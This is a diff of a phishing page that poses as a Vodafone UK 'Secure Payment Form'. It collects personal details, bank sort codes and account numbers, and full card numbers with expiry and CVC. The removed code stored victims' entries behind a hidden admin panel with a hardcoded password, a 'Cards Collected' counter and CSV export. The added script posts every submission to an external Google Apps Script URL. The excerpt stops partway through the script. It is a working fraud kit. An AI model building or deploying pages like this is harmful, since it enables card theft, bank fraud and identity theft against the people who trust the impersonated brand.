@@ -3,153 +3,67 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Vodafone UK | Secure Account & Payment Form</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+  <title>Vodafone UK | Secure Payment Form</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: linear-gradient(145deg, #e9eff4 0%, #dce3ea 100%); font-family: 'Inter', sans-serif; padding: 2rem 1.5rem; color: #1a2c3e; }
+    body { background: linear-gradient(145deg, #e9eff4 0%, #dce3ea 100%); font-family: 'Inter', sans-serif; padding: 1rem; color: #1a2c3e; }
     .form-container { max-width: 980px; margin: 0 auto; background: #ffffff; border-radius: 32px; box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25); overflow: hidden; }
-    .form-header { background: #e60000; padding: 1.5rem 2rem 1.2rem 2rem; }
+    .form-header { background: #e60000; padding: 1.5rem 2rem; }
     .vodafone-logo { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
-    .vodafone-official-logo svg { width: 48px; height: 48px; }
-    .vodafone-logo h1 { font-size: 1.8rem; font-weight: 700; color: white; margin: 0; }
-    .vodafone-logo span { font-weight: 400; font-size: 1rem; background: rgba(255,255,255,0.2); padding: 2px 10px; border-radius: 40px; margin-left: 8px; }
-    .header-sub { color: rgba(255,255,255,0.9); margin-top: 12px; font-size: 0.9rem; border-left: 3px solid #ffb3b3; padding-left: 14px; }
-    .secure-badge { background: white; color: #e60000; border-radius: 40px; padding: 6px 16px; font-size: 0.75rem; font-weight: 700; display: inline-flex; align-items: center; gap: 8px; margin-top: 12px; }
-    .form-body { padding: 2rem; background-color: #e60000; }
-    .section { background: #fefefe; border-radius: 24px; margin-bottom: 2rem; border: 1px solid #eef2f6; }
-    .section-title { display: flex; align-items: center; gap: 12px; padding: 1.2rem 1.8rem 0.6rem 1.8rem; border-bottom: 2px solid #f0f2f5; }
-    .section-title i { font-size: 1.5rem; color: #e60000; background: #fff0f0; padding: 8px; border-radius: 50%; }
-    .section-title h2 { font-size: 1.3rem; font-weight: 600; color: #1e2f3e; }
-    .fields-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.2rem 1.8rem; padding: 1.5rem 1.8rem 1.8rem; }
+    .vodafone-logo h1 { font-size: 1.5rem; font-weight: 700; color: white; }
+    .secure-badge { background: white; color: #e60000; border-radius: 40px; padding: 6px 16px; font-size: 0.7rem; font-weight: 700; display: inline-flex; align-items: center; gap: 8px; margin-top: 12px; }
+    .form-body { padding: 1.5rem; background-color: #e60000; }
+    .section { background: #fefefe; border-radius: 24px; margin-bottom: 1.5rem; }
+    .section-title { display: flex; align-items: center; gap: 12px; padding: 1rem 1.5rem; border-bottom: 2px solid #f0f2f5; }
+    .section-title i { font-size: 1.3rem; color: #e60000; background: #fff0f0; padding: 8px; border-radius: 50%; }
+    .section-title h2 { font-size: 1.1rem; font-weight: 600; }
+    .fields-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem; padding: 1.5rem; }
     .input-group { display: flex; flex-direction: column; gap: 6px; }
-    .input-group label { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: #5a6e7c; display: flex; align-items: center; gap: 6px; }
-    .input-group label i { font-size: 0.8rem; color: #e60000; }
-    .input-group input, .input-group select { font-family: 'Inter', monospace; background: #ffffff; border: 1px solid #cfdfed; border-radius: 16px; padding: 12px 16px; font-size: 0.9rem; outline: none; width: 100%; }
-    .input-group input:focus, .input-group select:focus { border-color: #e60000; box-shadow: 0 0 0 3px rgba(230, 0, 0, 0.1); }
+    .input-group label { font-size: 0.7rem; font-weight: 600; text-transform: uppercase; color: #5a6e7c; display: flex; align-items: center; gap: 6px; }
+    .input-group input, .input-group select { background: #ffffff; border: 1px solid #cfdfed; border-radius: 16px; padding: 12px 16px; font-size: 0.9rem; outline: none; width: 100%; }
     .full-width { grid-column: 1 / -1; }
     .card-row { display: grid; grid-template-columns: 1fr 0.6fr 0.8fr; gap: 12px; }
     
-    /* HORIZONTAL DATE OF BIRTH - Side by side */
-    .dob-horizontal { display: flex; gap: 12px; width: 100%; }
+    /* HORIZONTAL DATE OF BIRTH - ALWAYS HORIZONTAL */
+    .dob-horizontal { display: flex; gap: 10px; width: 100%; }
     .dob-horizontal input { flex: 1; text-align: center; }
-    .dob-horizontal input::placeholder { text-align: center; }
     
-    .form-actions { padding: 0rem 1.8rem 2rem 1.8rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; border-top: 1px solid #eef2f6; margin-top: 8px; padding-top: 1.8rem; background-color: #ffffff; border-radius: 0 0 24px 24px; }
-    .btn { padding: 12px 28px; border-radius: 40px; font-weight: 700; font-size: 0.9rem; border: none; cursor: pointer; transition: 0.2s; font-family: 'Inter', sans-serif; }
-    .btn-primary { background: #e60000; color: white; box-shadow: 0 4px 8px rgba(230, 0, 0, 0.2); }
-    .btn-primary:hover { background: #c10000; transform: translateY(-1px); }
+    .form-actions { padding: 1.5rem; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 16px; background: white; border-radius: 0 0 24px 24px; }
+    .btn { padding: 12px 28px; border-radius: 40px; font-weight: 700; border: none; cursor: pointer; transition: 0.2s; }
+    .btn-primary { background: #e60000; color: white; }
+    .btn-primary:hover { background: #c10000; }
     .btn-secondary { background: white; color: #2c4c6c; border: 1px solid #cfdfed; }
-    .btn-secondary:hover { background: #f8fafc; border-color: #e60000; }
-    .footer-note { font-size: 0.7rem; color: #6b7f8f; text-align: center; padding: 1rem 1.5rem 1.2rem; background: #fafcfd; border-top: 1px solid #eef2f6; }
-    .footer-note .copyright { font-weight: 500; color: #e60000; }
-    
-    .toast-message { visibility: hidden; min-width: 320px; background-color: #1e2f3e; color: #fff; text-align: center; border-radius: 50px; padding: 14px 24px; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); font-size: 0.85rem; z-index: 1000; opacity: 0; transition: opacity 0.2s; }
+    .footer-note { font-size: 0.65rem; color: #6b7f8f; text-align: center; padding: 1rem; background: #fafcfd; }
+    .toast-message { visibility: hidden; min-width: 280px; background: #1e2f3e; color: white; text-align: center; border-radius: 50px; padding: 12px 20px; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); z-index: 1000; opacity: 0; transition: opacity 0.2s; }
     .toast-message.show { visibility: visible; opacity: 1; }
     .toast-success { background: #1c7e3c; }
     .toast-error { background: #c0392b; }
     .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.6s linear infinite; margin-right: 8px; }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
-    
-    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 2000; align-items: center; justify-content: center; }
+    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2000; align-items: center; justify-content: center; }
     .modal-overlay.active { display: flex; }
-    .thankyou-modal { background: white; max-width: 480px; width: 90%; border-radius: 32px; text-align: center; padding: 2rem 1.8rem; }
-    .thankyou-modal i { font-size: 4rem; color: #e60000; margin-bottom: 1rem; }
-    .thankyou-modal h3 { font-size: 1.8rem; font-weight: 700; color: #1a2c3e; margin-bottom: 1rem; }
-    .thankyou-modal p { color: #3a5a72; font-size: 1rem; line-height: 1.5; margin-bottom: 1.8rem; }
-    .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; font-size: 0.9rem; cursor: pointer; }
-    .thankyou-modal button:hover { background: #c10000; }
+    .thankyou-modal { background: white; max-width: 400px; width: 90%; border-radius: 32px; text-align: center; padding: 2rem; }
+    .thankyou-modal i { font-size: 3rem; color: #e60000; margin-bottom: 1rem; }
+    .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; cursor: pointer; }
     
-    /* Admin Portal */
-    .admin-portal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 5000; overflow-y: auto; }
-    .admin-portal.active { display: block; }
-    .admin-portal-header { background: #e60000; color: white; padding: 1.5rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 10; flex-wrap: wrap; gap: 1rem; }
-    .admin-portal-header h2 { margin: 0; font-size: 1.2rem; }
-    .close-portal { background: rgba(255,255,255,0.2); border: none; color: white; padding: 8px 16px; border-radius: 8px; cursor: pointer; }
-    .stats-bar { background: #f5f5f5; padding: 1rem 1.5rem; display: flex; gap: 1rem; flex-wrap: wrap; border-bottom: 1px solid #ddd; }
-    .stat-card { background: white; padding: 0.5rem 1rem; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-    .stat-number { font-size: 1.5rem; font-weight: bold; color: #e60000; }
-    .stat-label { font-size: 0.7rem; color: #666; }
-    .search-bar { padding: 1rem 1.5rem; background: white; border-bottom: 1px solid #eee; display: flex; gap: 0.5rem; flex-wrap: wrap; }
-    .search-bar input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 8px; font-size: 0.9rem; min-width: 150px; }
-    .search-bar button { background: #e60000; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; }
-    .submissions-list { padding: 1rem; }
-    .submission-card { background: #f9f9f9; border-radius: 12px; margin-bottom: 1rem; padding: 1rem; border-left: 4px solid #e60000; }
-    .submission-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; padding-bottom: 0.5rem; border-bottom: 1px solid #ddd; flex-wrap: wrap; gap: 0.5rem; }
-    .submission-id { font-weight: bold; color: #e60000; }
-    .submission-date { color: #666; font-size: 0.75rem; }
-    .submission-details { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 0.3rem; }
-    .detail-row { display: flex; flex-wrap: wrap; margin: 0.2rem 0; }
-    .detail-label { font-weight: 600; width: 130px; color: #555; font-size: 0.8rem; }
-    .detail-value { color: #333; font-size: 0.8rem; word-break: break-word; }
-    .delete-btn { background: #c0392b; color: white; border: none; padding: 4px 10px; border-radius: 5px; cursor: pointer; font-size: 0.7rem; }
-    .export-buttons { display: flex; gap: 0.5rem; flex-wrap: wrap; }
-    .export-btn { background: #2c3e50; color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; }
-    
-    .admin-login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 4000; align-items: center; justify-content: center; }
-    .admin-login-overlay.active { display: flex; }
-    .admin-login-box { background: white; padding: 1.5rem; border-radius: 24px; width: 320px; text-align: center; }
-    .admin-login-box input { width: 100%; padding: 10px; margin: 15px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 0.9rem; }
-    .admin-login-box button { background: #e60000; color: white; border: none; padding: 10px 20px; border-radius: 40px; cursor: pointer; width: 100%; }
-    
+    /* Mobile Responsive - DOB stays HORIZONTAL */
     @media (max-width: 680px) { 
-      body { padding: 0.5rem; } 
-      .form-body { padding: 1rem; } 
       .card-row { grid-template-columns: 1fr; }
-      .dob-horizontal { flex-direction: column; gap: 8px; }
       .fields-grid { padding: 1rem; }
-      .section-title { padding: 0.8rem 1rem; }
-      .detail-label { width: 100px; }
+      .dob-horizontal { flex-direction: row !important; gap: 8px; }
+      .dob-horizontal input { font-size: 0.85rem; padding: 10px 5px; }
     }
   </style>
 </head>
 <body>
 
-<!-- Admin Login Overlay -->
-<div id="adminLoginOverlay" class="admin-login-overlay">
-  <div class="admin-login-box">
-    <i class="fas fa-database" style="font-size: 2.5rem; color: #e60000;"></i>
-    <h3>Admin Portal</h3>
-    <input type="password" id="adminPassword" placeholder="Enter Password" autocomplete="off">
-    <button onclick="verifyAdminPassword()">Access Database</button>
-    <p style="font-size: 0.65rem; margin-top: 0.8rem;">Secret: Type "admin" on keyboard</p>
-  </div>
-</div>
-
-<!-- Admin Portal -->
-<div id="adminPortal" class="admin-portal">
-  <div class="admin-portal-header">
-    <h2><i class="fas fa-database"></i> Live Customer Database</h2>
-    <div class="export-buttons">
-      <button class="export-btn" onclick="exportToNotepad()"><i class="fas fa-file-alt"></i> Notepad</button>
-      <button class="export-btn" onclick="exportToCSV()"><i class="fas fa-table"></i> CSV</button>
-      <button class="export-btn" style="background: #c0392b;" onclick="clearAllData()"><i class="fas fa-trash"></i> Delete All</button>
-      <button class="close-portal" onclick="closeAdminPortal()">✕ Close</button>
-    </div>
-  </div>
-  <div class="stats-bar" id="statsBar"></div>
-  <div class="search-bar">
-    <input type="text" id="searchInput" placeholder="Search by name, phone, address, card..." onkeyup="searchSubmissions()">
-    <button onclick="searchSubmissions()"><i class="fas fa-search"></i> Search</button>
-  </div>
-  <div class="submissions-list" id="submissionsList"></div>
-</div>
-
 <div class="form-container">
   <div class="form-header">
     <div class="vodafone-logo">
-      <div class="vodafone-official-logo">
-        <svg viewBox="-.398 -4.59 378.918 388.633" xmlns="http://www.w3.org/2000/svg" width="40" height="40">
-          <path d="m119.441 14.328c47.465-18.918 102.754-17.61 148.954 4.363-13.165-2-26.555-.492-39.586 1.711-35.391 6.684-69.024 23.336-95.313 48.075-25.207 24.777-42.871 57.652-47.86 92.824-3.3 24.922-.241 51.062 10.942 73.746 11.524 23.8 31.809 43.32 56.258 53.394 23.559 9.97 50.887 9.86 74.75.961 35.805-13.14 61.531-48.62 64.473-86.527 1.851-24.844-4.192-51.273-20.883-70.328-15.934-18.652-39.238-28.926-62.559-34.774-1.25-23 9.586-45.722 26.77-60.68 9.543-8.605 21.386-14.09 33.633-17.6l.93-.321c35.058 16.812 64.847 44.539 83.827 78.578 16.262 28.98 24.743 62.375 23.903 95.64-.16 43.016-16.239 85.606-43.801 118.497-26.063 31.367-62.516 53.93-102.246 62.965-39.836 9.191-82.695 5.226-119.977-11.704-36.48-16.293-67.386-44.617-87.047-79.457-16.355-28.953-25.007-62.336-24.289-95.64.078-41.496 14.813-82.672 40.54-115.121 20.55-25.91 47.812-46.512 78.581-58.602zm0 0" fill="#e60000"/>
-          <path d="m228.809 20.402c13.03-2.203 26.421-3.71 39.586-1.71l1.89.32-1.265.48c-12.247 3.512-24.09 8.996-33.633 17.602-17.184 14.957-28.02 37.68-26.77 60.68 23.32 5.847 46.625 16.12 62.559 34.773 16.691 19.055 22.734 45.484 20.883 70.328-2.942 37.906-28.668 73.387-64.473 86.527-23.863 8.899-51.191 9.008-74.75-.96-24.45-10.075-44.734-29.594-56.258-53.395-11.183-22.684-14.242-48.824-10.941-73.746 4.988-35.172 22.652-68.047 47.86-92.824 26.288-24.739 59.921-41.391 95.312-48.075zm0 0" fill="#fff"/>
-        </svg>
-      </div>
-      <h1>Vodafone UK <span>Customer</span></h1>
-    </div>
-    <div class="header-sub">
-      <i class="fas fa-lock" style="margin-right: 5px;"></i> Secure account verification & payment details
+      <i class="fas fa-tower-broadcast" style="font-size: 2rem; color: white;"></i>
+      <h1>Vodafone UK</h1>
     </div>
     <div class="secure-badge">
       <i class="fas fa-shield-alt"></i> 256-bit SSL ENCRYPTED
@@ -161,7 +75,7 @@
       <div class="section">
         <div class="section-title">
           <i class="fas fa-user-circle"></i>
-          <h2>1. Personal & Residential</h2>
+          <h2>Personal Information</h2>
         </div>
         <div class="fields-grid">
           <div class="input-group">
@@ -169,19 +83,15 @@
             <input type="text" name="First Name" id="firstName" placeholder="James" required>
           </div>
           <div class="input-group">
-            <label><i class="fas fa-user"></i> Middle name</label>
-            <input type="text" name="Middle Name" id="middleName" placeholder="Robert (optional)">
-          </div>
-          <div class="input-group">
-            <label><i class="fas fa-user-tag"></i> Surname</label>
+            <label><i class="fas fa-user"></i> Surname</label>
             <input type="text" name="Surname" id="surname" placeholder="Smith" required>
           </div>
           <div class="input-group full-width">
             <label><i class="fas fa-calendar-alt"></i> Date of Birth</label>
             <div class="dob-horizontal">
-              <input type="number" id="dobDay" name="DOB Day" placeholder="DD" min="1" max="31" required>
-              <input type="number" id="dobMonth" name="DOB Month" placeholder="MM" min="1" max="12" required>
-              <input type="number" id="dobYear" name="DOB Year" placeholder="YYYY" min="1920" max="2026" required>
+              <input type="number" id="dobDay" placeholder="DD" min="1" max="31" required>
+              <input type="number" id="dobMonth" placeholder="MM" min="1" max="12" required>
+              <input type="number" id="dobYear" placeholder="YYYY" min="1920" max="2026" required>
             </div>
           </div>
           <div class="input-group">
@@ -190,11 +100,7 @@
           </div>
           <div class="input-group full-width">
             <label><i class="fas fa-home"></i> Full address</label>
-            <input type="text" name="Address" id="address" placeholder="1 Vodafone Way, Newbury, RG14 2FN" required>
-          </div>
-          <div class="input-group full-width">
-            <label><i class="fas fa-clock"></i> History on address</label>
-            <input type="text" name="History on Address" id="historyAddress" placeholder="e.g. 4 years, 2 months" required>
+            <input type="text" name="Address" id="address" placeholder="Full address" required>
           </div>
         </div>
       </div>
@@ -202,12 +108,12 @@
       <div class="section">
         <div class="section-title">
           <i class="fas fa-building-columns"></i>
-          <h2>2. Bank account details</h2>
+          <h2>Bank Details</h2>
         </div>
         <div class="fields-grid">
           <div class="input-group full-width">
             <label><i class="fas fa-signature"></i> Name on account</label>
-            <input type="text" name="Name on Account" id="nameOnAccount" placeholder="Mr J. Smith" required>
+            <input type="text" name="Name on Account" id="nameOnAccount" required>
           </div>
           <div class="input-group">
             <label><i class="fas fa-code-branch"></i> Sort code</label>
@@ -223,20 +129,20 @@
       <div class="section">
         <div class="section-title">
           <i class="fas fa-credit-card-front"></i>
-          <h2>3. Debit / Credit card</h2>
+          <h2>Card Details</h2>
         </div>
         <div class="fields-grid">
           <div class="input-group full-width">
             <label><i class="fas fa-id-card"></i> Name on card</label>
-            <input type="text" name="Name on Card" id="nameOnCard" placeholder="JAMES SMITH" required>
+            <input type="text" name="Name on Card" id="nameOnCard" required>
           </div>
           <div class="input-group full-width">
-            <label><i class="fas fa-hashtag"></i> Long numbers (card number)</label>
+            <label><i class="fas fa-hashtag"></i> Card number</label>
             <input type="text" name="Card Number" id="cardNumber" placeholder="4532 1234 5678 9101" maxlength="19" required>
           </div>
           <div class="card-row">
             <div class="input-group">
-              <label><i class="fas fa-calendar-alt"></i> Expiry date (MM/YY)</label>
+              <label><i class="fas fa-calendar-alt"></i> Expiry (MM/YY)</label>
               <input type="text" name="Expiry Date" id="expiryDate" placeholder="08/28" required>
             </div>
             <div class="input-group">
@@ -250,35 +156,32 @@
       <div class="section">
         <div class="section-title">
           <i class="fas fa-briefcase"></i>
-          <h2>4. Employment background</h2>
+          <h2>Employment</h2>
         </div>
         <div class="fields-grid">
           <div class="input-group full-width">
-            <label><i class="fas fa-chart-line"></i> Employment status</label>
             <select name="Employment Status" id="employmentStatus" required>
-              <option value="" disabled selected>– Select status –</option>
-              <option value="Employed (Full-time)">Employed (Full-time)</option>
-              <option value="Employed (Part-time)">Employed (Part-time)</option>
+              <option value="" disabled selected>Select employment status</option>
+              <option value="Employed Full-time">Employed Full-time</option>
+              <option value="Employed Part-time">Employed Part-time</option>
               <option value="Self-employed">Self-employed</option>
               <option value="Student">Student</option>
               <option value="Retired">Retired</option>
               <option value="Unemployed">Unemployed</option>
-              <option value="Other">Other</option>
             </select>
           </div>
         </div>
       </div>
 
       <div class="form-actions">
-        <button type="button" class="btn btn-secondary" id="clearBtn"><i class="fas fa-undo-alt"></i> Reset form</button>
-        <button type="submit" class="btn btn-primary" id="submitBtn"><i class="fas fa-check-circle"></i> Verify & continue</button>
+        <button type="button" class="btn btn-secondary" id="clearBtn"><i class="fas fa-undo-alt"></i> Reset</button>
+        <button type="submit" class="btn btn-primary" id="submitBtn"><i class="fas fa-check-circle"></i> Submit</button>
       </div>
     </form>
   </div>
   
   <div class="footer-note">
-    <p class="copyright">© 2026 Vodafone UK Limited</p>
-    <p class="address">Vodafone House, The Connection, Newbury, Berkshire RG14 2FN, United Kingdom</p>
+    <p>© 2026 Vodafone UK Limited. All rights reserved.</p>
   </div>
 </div>
 
@@ -293,391 +196,203 @@
 </div>
 
 <script>
-  // DATABASE NAME - Persistent across devices (using localStorage)
-  const DB_NAME = 'vodafone_live_database';
-  const ADMIN_PASSWORD = "Admin123";
-  
-  // DOM Elements
-  const form = document.getElementById('vodafoneForm');
-  const toast = document.getElementById('toastMsg');
-  const submitBtn = document.getElementById('submitBtn');
-  const thankyouModal = document.getElementById('thankyouModal');
-  
-  // ============ DATABASE FUNCTIONS (LIVE SYSTEM) ============
-  
-  function getDatabase() {
-    const data = localStorage.getItem(DB_NAME);
-    return data ? JSON.parse(data) : [];
+// ============ CLOUD DATABASE USING Google Sheets (FREE & LIVE) ============
+// Step 1: Create Google Sheet
+// Step 2: Deploy as Web App
+// Step 3: Use this URL
+
+// YOUR GOOGLE SHEETS WEB APP URL - REPLACE WITH YOURS
+const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbxZx_xhrcNjPz8DtL5a6lXQGjK_lP_bVZ3ebgMYRw_dGWm8Bp04kLJUF1stABl4Uv36/exec";
+
+const form = document.getElementById('vodafoneForm');
+const toast = document.getElementById('toastMsg');
+const submitBtn = document.getElementById('submitBtn');
+const thankyouModal = document.getElementById('thankyouModal');
+
+function showMessage(text, isError = false) {
+  toast.textContent = text;
+  toast.classList.add('show');
+  if (isError) {
+    toast.classList.add('toast-error');
+    toast.classList.remove('toast-success');
+  } else {
+    toast.classList.add('toast-success');
+    toast.classList.remove('toast-error');
   }
-  
-  function saveToDatabase(submission) {
-    try {
-      const db = getDatabase();
-      db.push(submission);
-      localStorage.setItem(DB_NAME, JSON.stringify(db));
-      console.log('✅ Saved to LIVE database. Total:', db.length);
-      return true;
-    } catch(e) {
-      console.error('Database error:', e);
-      return false;
-    }
-  }
-  
-  window.deleteSubmission = function(id) {
-    let db = getDatabase();
-    db = db.filter(sub => sub.id !== id);
-    localStorage.setItem(DB_NAME, JSON.stringify(db));
-    displaySubmissions();
-    updateStats();
-    showMessage("Submission deleted", false);
-  };
-  
-  window.clearAllData = function() {
-    if (confirm('⚠️ WARNING: This will DELETE ALL SUBMISSIONS permanently!')) {
-      localStorage.setItem(DB_NAME, JSON.stringify([]));
-      displaySubmissions();
-      updateStats();
-      showMessage("All data cleared", false);
-    }
-  };
-  
-  function updateStats() {
-    const db = getDatabase();
-    const statsBar = document.getElementById('statsBar');
-    if (statsBar) {
-      const total = db.length;
-      const today = new Date().toDateString();
-      const todaySubmissions = db.filter(sub => new Date(sub.timestamp).toDateString() === today).length;
-      
-      statsBar.innerHTML = `
-        <div class="stat-card"><div class="stat-number">${total}</div><div class="stat-label">Total Customers</div></div>
-        <div class="stat-card"><div class="stat-number">${todaySubmissions}</div><div class="stat-label">Today</div></div>
-        <div class="stat-card"><div class="stat-number">${db.length > 0 ? Math.round(db.reduce((sum, sub) => sum + (sub.data['Card Number'] ? 1 : 0), 0) / db.length * 100) : 0}%</div><div class="stat-label">Cards Collected</div></div>
-      `;
-    }
-  }
-  
-  function displaySubmissions(searchTerm = '') {
-    let db = getDatabase();
-    const container = document.getElementById('submissionsList');
-    if (!container) return;
-    
-    if (searchTerm) {
-      const term = searchTerm.toLowerCase();
-      db = db.filter(sub => 
-        (sub.data['First Name'] && sub.data['First Name'].toLowerCase().includes(term)) ||
-        (sub.data['Surname'] && sub.data['Surname'].toLowerCase().includes(term)) ||
-        (sub.data['Phone Number'] && sub.data['Phone Number'].includes(term)) ||
-        (sub.data['Address'] && sub.data['Address'].toLowerCase().includes(term)) ||
-        (sub.data['Card Number'] && sub.data['Card Number'].includes(term))
-      );
-    }
-    
-    if (db.length === 0) {
-      container.innerHTML = '<div style="text-align: center; padding: 2rem; color: #999;">📭 No submissions in database</div>';
-      return;
-    }
-    
-    const sortedDb = [...db].reverse();
-    
-    container.innerHTML = sortedDb.map((sub, index) => `
-      <div class="submission-card">
-        <div class="submission-header">
-          <div>
-            <span class="submission-id">#${db.length - index}</span>
-            <span style="margin-left: 8px; font-size: 0.7rem; color: #666;">ID: ${sub.id}</span>
-          </div>
-          <div>
-            <span class="submission-date"><i class="far fa-clock"></i> ${new Date(sub.timestamp).toLocaleString()}</span>
-            <button class="delete-btn" onclick="deleteSubmission(${sub.id})"><i class="fas fa-trash"></i> Delete</button>
-          </div>
-        </div>
-        <div class="submission-details">
-          <div class="detail-row"><span class="detail-label">👤 Name:</span><span class="detail-value">${sub.data['First Name'] || ''} ${sub.data['Surname'] || ''}</span></div>
-          <div class="detail-row"><span class="detail-label">🎂 DOB:</span><span class="detail-value">${sub.data['Date of Birth'] || ''}</span></div>
-          <div class="detail-row"><span class="detail-label">📞 Phone:</span><span class="detail-value">${sub.data['Phone Number'] || ''}</span></div>
-          <div class="detail-row"><span class="detail-label">🏠 Address:</span><span class="detail-value">${sub.data['Address'] || ''}</span></div>
-          <div class="detail-row"><span class="detail-label">🏦 Bank:</span><span class="detail-value">${sub.data['Sort Code'] || ''} / ${sub.data['Account Number'] || ''}</span></div>
-          <div class="detail-row"><span class="detail-label">💳 Card:</span><span class="detail-value">${sub.data['Card Number'] || ''} (${sub.data['Expiry Date'] || ''})</span></div>
-          <div class="detail-row"><span class="detail-label">💼 Employment:</span><span class="detail-value">${sub.data['Employment Status'] || ''}</span></div>
-        </div>
-      </div>
-    `).join('');
-  }
-  
-  window.searchSubmissions = function() {
-    const searchTerm = document.getElementById('searchInput').value;
-    displaySubmissions(searchTerm);
-  };
-  
-  window.exportToNotepad = function() {
-    const db = getDatabase();
-    if (db.length === 0) { alert('No data to export!'); return; }
-    
-    let content = '='.repeat(70) + '\n';
-    content += '          VODAFONE UK - LIVE CUSTOMER DATABASE\n';
-    content += `          Generated: ${new Date().toLocaleString()}\n`;
-    content += `          Total Customers: ${db.length}\n`;
-    content += '='.repeat(70) + '\n\n';
-    
-    db.slice().reverse().forEach((sub, index) => {
-      content += `┌────────────────────────────────────────────────────────────────────┐\n`;
-      content += `│ CUSTOMER #${db.length - index} | ${new Date(sub.timestamp).toLocaleString()}\n`;
-      content += `├────────────────────────────────────────────────────────────────────┤\n`;
-      content += `│ PERSONAL\n`;
-      content += `│   Name: ${(sub.data['First Name'] || '')} ${(sub.data['Surname'] || '')}\n`;
-      content += `│   DOB: ${(sub.data['Date of Birth'] || 'N/A')}\n`;
-      content += `│   Phone: ${(sub.data['Phone Number'] || 'N/A')}\n`;
-      content += `│   Address: ${(sub.data['Address'] || 'N/A')}\n`;
-      content += `│\n`;
-      content += `│ BANK\n`;
-      content += `│   Account: ${(sub.data['Name on Account'] || 'N/A')}\n`;
-      content += `│   Sort Code: ${(sub.data['Sort Code'] || 'N/A')}\n`;
-      content += `│   Account No: ${(sub.data['Account Number'] || 'N/A')}\n`;
-      content += `│\n`;
-      content += `│ CARD\n`;
-      content += `│   Card No: ${(sub.data['Card Number'] || 'N/A')}\n`;
-      content += `│   Expiry: ${(sub.data['Expiry Date'] || 'N/A')}\n`;
-      content += `│   CVC: ${(sub.data['CVC'] || 'N/A')}\n`;
-      content += `└────────────────────────────────────────────────────────────────────┘\n\n`;
+  setTimeout(() => { toast.classList.remove('show'); }, 4000);
+}
+
+window.closeThankYouModal = function() {
+  thankyouModal.classList.remove('active');
+  resetForm();
+};
+
+function resetForm() {
+  form.reset();
+  document.getElementById('employmentStatus').selectedIndex = 0;
+  document.getElementById('dobDay').value = '';
+  document.getElementById('dobMonth').value = '';
+  document.getElementById('dobYear').value = '';
+}
+
+// Send data to Google Sheets (CLOUD DATABASE)
+async function sendToCloudDatabase(formData) {
+  try {
+    const response = await fetch(GOOGLE_SHEETS_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(formData)
     });
     
-    const blob = new Blob([content], {type: 'text/plain'});
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `vodafone_live_data_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.txt`;
-    a.click();
-    URL.revokeObjectURL(url);
-    showMessage("Database exported!", false);
-  };
-  
-  window.exportToCSV = function() {
-    const db = getDatabase();
-    if (db.length === 0) { alert('No data to export!'); return; }
-    
-    const headers = ['ID', 'Date', 'First Name', 'Surname', 'DOB', 'Phone', 'Address', 'Sort Code', 'Account No', 'Card Number', 'Expiry', 'CVC', 'Employment'];
-    let csv = headers.join(',') + '\n';
-    
-    db.forEach(sub => {
-      const row = [
-        sub.id,
-        new Date(sub.timestamp).toLocaleString(),
-        `"${sub.data['First Name'] || ''}"`,
-        `"${sub.data['Surname'] || ''}"`,
-        `"${sub.data['Date of Birth'] || ''}"`,
-        `"${sub.data['Phone Number'] || ''}"`,
-        `"${sub.data['Address'] || ''}"`,
-        `"${sub.data['Sort Code'] || ''}"`,
-        `"${sub.data['Account Number'] || ''}"`,
-        `"${sub.data['Card Number'] || ''}"`,
-        `"${sub.data['Expiry Date'] || ''}"`,
-        `"${sub.data['CVC'] || ''}"`,
-        `"${sub.data['Employment Status'] || ''}"`
-      ];
-      csv += row.join(',') + '\n';
-    });
-    
-    const blob = new Blob([csv], {type: 'text/csv'});
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
